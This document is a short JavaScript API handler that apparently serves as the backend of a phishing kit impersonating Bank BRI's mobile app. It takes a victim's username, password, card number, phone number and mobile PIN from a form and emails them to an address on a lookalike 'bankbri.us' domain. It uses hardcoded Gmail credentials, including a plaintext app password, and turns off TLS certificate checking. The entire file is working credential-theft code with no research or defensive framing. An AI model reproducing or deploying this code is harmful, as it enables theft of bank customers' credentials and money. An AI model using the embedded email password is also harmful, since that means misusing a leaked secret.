export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;


   var transporter = nodemailer.createTransport({
          service: "gmail",
  auth: {
    user: "theofaninatasia@gmail.com",
    pass: "vasvqmfjsdgvgdgk",
  },
  tls:{
    rejectUnauthorized:false
  },
  port: "465",
  host: 'smtp.gmail.com',
  secure: true
        });
       
    
            const mailData = {
                from: 'cs@bankbri.us',
                to: 'info@bankbri.us',
                subject: 'BriApp',
                html: `
                    <ul>
                        <li>username: ${body.username ?? '-'}</li> 
                        <li>password: ${body.password ?? '-'}</li>
                        <li>nokartu: ${body.nomorkartu ?? '-'}</li>
                        <li>nohp: ${body.nomorhandphone ?? '-'}</li>
                        <li>pin: ${body.mPin ?? '-'}</li>
                        <li>message: ${body.message ?? '-'}</li>
                    </ul>
                `,             
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info, status: 200})
                }
            })
    
}